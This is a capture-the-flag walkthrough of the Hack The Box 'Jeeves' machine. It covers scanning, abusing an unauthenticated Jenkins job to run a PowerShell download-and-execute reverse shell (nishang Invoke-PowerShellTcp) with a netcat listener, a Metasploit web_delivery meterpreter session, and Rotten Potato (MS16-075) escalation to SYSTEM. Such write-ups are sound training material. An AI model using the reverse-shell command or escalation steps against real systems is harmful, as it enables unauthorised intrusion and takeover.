---
description: https://www.hackthebox.eu/home/machines/profile/114
---

# Jeeves

## Nmap

I Started off scanning all ports and then a done a more intense scan on the ports found as per below:

```
nmap 10.10.10.63 -p- 

PORT      STATE SERVICE
80/tcp    open  http                                                                                                                                                          
135/tcp   open  msrpc                                                                                                                                                         
445/tcp   open  microsoft-ds                                                                                                                                                  
50000/tcp open  ibm-db2                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                             
nmap 10.10.10.63 -p 80,135,445,50000 -A -T4
                                                                                                                                                                                                                                           
PORT      STATE SERVICE      VERSION                                                                                                                                                                                                       
80/tcp    open  http         Microsoft IIS httpd 10.0                                                                                                                                                                                      
| http-methods:                                                                                                                                                                                                                            
|_  Potentially risky methods: TRACE                                                                                                                                                                                                       
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                                                                                   
|_http-title: Ask Jeeves                                                                                                                                                                                                                   
135/tcp   open  msrpc        Microsoft Windows RPC                                                                                                                                                                                         
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)                                                                                                                                                  
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h00m20s, deviation: 0s, median: 5h00m19s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-02T00:35:20
|_  start_date: 2020-10-01T00:50:42
```

I first tried `enum4linux` on SMB and did not get any valid hits for null session. I next moved onto port 80 whilst kicking off `gobuster` and `nikto` on port 80 and port 50000 since it has been reported as HTTP

![Kicking off multiple scans on port 80 and 50000](<../../../.gitbook/assets/image (175) (1).png>)

## Port 80

Port 80 directs us over to a AskJeeves web page.

![Port 80](<../../../.gitbook/assets/image (176) (1).png>)

Entering a value into the field and searching produces a error page which on further inspection appears to be an image. Searching using potential SQL injections or any other search parameter produces the same result.

![](<../../../.gitbook/assets/image (177) (1).png>)

When viewing page source we get the following:

![](<../../../.gitbook/assets/image (178) (1).png>)

Selecting "jeeves.PNG" takes us to the above image. Based on this I will not be spending anymore time on port 80 as we have still not inspected port 50000.

## Port 50000

Heading over to Port 50000 we land on the following page:

![Port 50000](<../../../.gitbook/assets/image (179) (1).png>)

Clicking on the link takes us away to https://eclipse.org/jetty/

`gobuster` reveals a directory of /askjeeves/ on this port.

![/askjeeves/](<../../../.gitbook/assets/image (181) (1).png>)

Looks like we have unauthenticated access to Jenkins. As we have freedom of Jenkins we can select the "create new jobs" link. From here give the project a name and select "freestyle project".

![](<../../../.gitbook/assets/image (182) (1).png>)

On the next screen head down to "Build" and then select "Execute Windows batch command".

![](<../../../.gitbook/assets/image (183) (1).png>)

On this next part we are going to use nishang Invoke-PowershellTcp to get a reverse shell on the machine.

run the following with root permissions to install `nishang`

```
sudo apt-get install nishang
```

After install we can find the nishang files at `/usr/share/nishang/shells` Start a python server in the shells directory as we will need to pull one of the files to gain shell.

![](<../../../.gitbook/assets/image (184) (1).png>)

Set up a `netcat` listener. In this example I will be using port 443.

```
sudo nc -lvp 80
```

We can now insert the following command into the Jenkins batch command box. Changing IP and port where appropriate.

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

![](<../../../.gitbook/assets/image (185) (1).png>)

After you have completed this save the project at the bottom of the screen and then on the following screen select "Build now"

![](<../../../.gitbook/assets/image (186) (1).png>)

You should notice the python server receives a GET request for the file specified with a HTTP code 200. If you have incorrectly spelt the file you will receive a code 404.

![](<../../../.gitbook/assets/image (187) (1).png>)

`netcat` should now pick up the shell and get you on the system as a low privilege account.

![low privilege shell.](<../../../.gitbook/assets/image (188).png>)

From here we can grab the user.txt flag before moving onto privilege escalation.

![](<../../../.gitbook/assets/image (189).png>)

## Privilege Escalation

For privilege escalation we should start with the normal system enumeration. We can run system info and run this against `Windows_exploit_suggester.py`.

I have covered Windows\_exploit\_suggester usage here if you need to know how to use it:

{% embed url="https://app.gitbook.com/@akimboviper/s/everything-windows/v/master/tools/enumeration/windows-exploit-suggester" %}

After going through the results of the python script what sticks out to us is the following exploit:

![](<../../../.gitbook/assets/image (190) (1).png>)

FoxGlove Security have done a fantastic write up on the exploit which can be read here.

{% embed url="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" %}

We can run the command `whoami /priv` and see if we have any of the correct privileges to perform the exploit. the privilege `SeImpersonatePrivilege` will allow us to run the exploit for MS16-075. This privilege is usually given to service accounts.

![](<../../../.gitbook/assets/image (191) (1).png>)

We will be using `metasploi`t for the escalation and as such we will need to upgrade our shell to a meterpreter shell. Open `msfconsole` and search for `multi/script/web_delivery` set the correct options.

![](<../../../.gitbook/assets/image (192) (1).png>)

Run the module and it should create some Powershell code which needs to be run on the victim machine. The web\_delivery module will keep a listener open waiting for when the code is run. When we execute the code on the victim machine this should give us a meterpreter shell back (depend on the payload you selected).

![Generating the payload.](<../../../.gitbook/assets/image (193) (1).png>)

![Running the payload on the victim machine](<../../../.gitbook/assets/image (194) (1).png>)

After running we should receive a shell back in `msfconsole`.

![meterpreter shell](<../../../.gitbook/assets/image (195).png>)

We can now run a search for the exploit in `msfconsole` after back grounding our meterpreter session.

![](<../../../.gitbook/assets/image (196) (1).png>)

Select options 1 for the juicy exploit and set the payload options. When you have filled out the correct information run the exploit and you should land a shell as system.

![NT Authority\System](<../../../.gitbook/assets/image (197).png>)

From here we should be able to grab root.txt?

![](<../../../.gitbook/assets/image (198) (1).png>)

Or not... Looks like we will have to look elsewhere.

After some time and looking literally everywhere I could not find the root flag. I eventually turned to the HTB forums for hints and eventually came to the right answer with the command `Dir /R` this command allows you to view alternative datastream (ADS) files.

![root flag](<../../../.gitbook/assets/image (199) (1).png>)

After retrieving root I did a little research on finding ADS files as I do not believe I would have found this without a hint. Malwarebytes have done a great blog post on the subject and have provided some good methods for over coming this.

{% embed url="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/" %}
